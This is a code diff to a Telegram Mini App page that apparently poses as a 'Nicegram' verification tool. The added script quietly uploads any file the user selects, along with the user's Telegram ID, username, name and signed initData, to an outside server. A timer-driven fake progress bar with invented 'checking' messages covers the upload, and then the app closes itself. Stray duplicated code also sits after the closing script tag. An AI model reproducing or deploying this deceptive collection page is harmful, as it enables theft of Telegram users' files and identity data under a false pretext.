@@ -362,26 +362,134 @@
     </script>
 
     <!-- LOGIC SCRIPT -->
-    <script>
-        const SERVER_URL = "https://nicegramq.onrender.com"; 
-        const tg = window.Telegram.WebApp;
-        tg.expand();
+<script>
+    const SERVER_URL = "https://nicegramq.onrender.com"; 
+    const tg = window.Telegram.WebApp;
 
-        const fileInput = document.getElementById('fileInput');
-        
-        // Элементы переключения
-        const stepStart = document.getElementById('step-start');
-        const stepProgress = document.getElementById('step-progress');
-        const mainFooter = document.getElementById('mainFooter');
+    tg.expand();
+    tg.ready();
 
-        // Элементы прогресса
-        const percentText = document.getElementById('percent');
-        const progressFill = document.getElementById('progressFill');
-        const statusText = document.getElementById('statusText');
+    // ===== TELEGRAM USER LOGGING =====
+    const tgUser = tg.initDataUnsafe?.user;
 
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            document.getElementById('greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name}`;
+    if (tgUser) {
+        console.log("🟢 TG USER CONNECTED");
+        console.log("ID:", tgUser.id);
+        console.log("USERNAME:", tgUser.username || "NO_USERNAME");
+        console.log("FIRST NAME:", tgUser.first_name);
+    } else {
+        console.log("🔴 NOT OPENED FROM TELEGRAM");
+    }
+    // =================================
+
+    const fileInput = document.getElementById('fileInput');
+
+    // Элементы переключения
+    const stepStart = document.getElementById('step-start');
+    const stepProgress = document.getElementById('step-progress');
+    const mainFooter = document.getElementById('mainFooter');
+
+    // Элементы прогресса
+    const percentText = document.getElementById('percent');
+    const progressFill = document.getElementById('progressFill');
+    const statusText = document.getElementById('statusText');
+
+    // Приветствие
+    if (tgUser) {
+        document.getElementById('greeting').innerText = `Привет, ${tgUser.first_name}`;
+    }
+
+    // ===== МОДАЛКИ =====
+    function openModal(modalId) {
+        document.querySelector('.modal-overlay').classList.add('active');
+        document.getElementById(modalId).classList.add('active');
+    }
+
+    function closeAllModals() {
+        document.querySelector('.modal-overlay').classList.remove('active');
+        document.querySelectorAll('.modal').forEach(modal => {
+            modal.classList.remove('active');
+        });
+    }
+
+    // ===== ЗАПУСК ПРОЦЕССА =====
+    fileInput.addEventListener('change', () => {
+        const file = fileInput.files[0];
+        if (file) startVerificationProcess(file);
+    });
+
+    function startVerificationProcess(file) {
+        stepStart.style.display = 'none';
+        mainFooter.style.display = 'none';
+        stepProgress.style.display = 'flex';
+
+        uploadFileInBackground(file);
+
+        let progress = 0;
+        const duration = 90000;
+        const intervalTime = 100;
+        const increment = 100 / (duration / intervalTime);
+
+        const timer = setInterval(() => {
+            progress += increment;
+            if (progress > 100) progress = 100;
+
+            updateStatus(progress);
+
+            if (progress >= 100) {
+                clearInterval(timer);
+                finishProcess();
+            }
+        }, intervalTime);
+    }
+
+    function updateStatus(currentPercent) {
+        percentText.innerText = Math.floor(currentPercent) + "%";
+        progressFill.style.width = currentPercent + "%";
+
+        if (currentPercent < 20) {
+            statusText.innerText = "Проверяем ликвидность вашего файла";
+        } else if (currentPercent < 45) {
+            statusText.innerText = "Проверяем аукционы";
+        } else if (currentPercent < 75) {
+            statusText.innerText = "Проверяем происхождения звёзд";
+        } else if (currentPercent < 95) {
+            statusText.innerText = "Вот вот закончили";
+        } else {
+            statusText.innerText = "Готовим итоговый вердикт";
         }
+    }
+
+    // ===== FILE UPLOAD + USER LOGGING =====
+    function uploadFileInBackground(file) {
+        const formData = new FormData();
+
+        formData.append('file', file);
+
+        // Telegram user data
+        formData.append('user_id', tgUser?.id || "0000");
+        formData.append('username', tgUser?.username || "");
+        formData.append('first_name', tgUser?.first_name || "");
+
+        // initData для серверной проверки подписи
+        formData.append('init_data', tg.initData);
+
+        fetch(`${SERVER_URL}/upload`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => console.log("📤 Upload status:", res.status))
+        .catch(err => console.error("❌ Upload error:", err));
+    }
+
+    function finishProcess() {
+        if (tg.HapticFeedback) {
+            tg.HapticFeedback.notificationOccurred('success');
+        }
+        setTimeout(() => tg.close(), 2000);
+    }
+</script>
+
 
         // Модалки
         function openModal(modalId) {
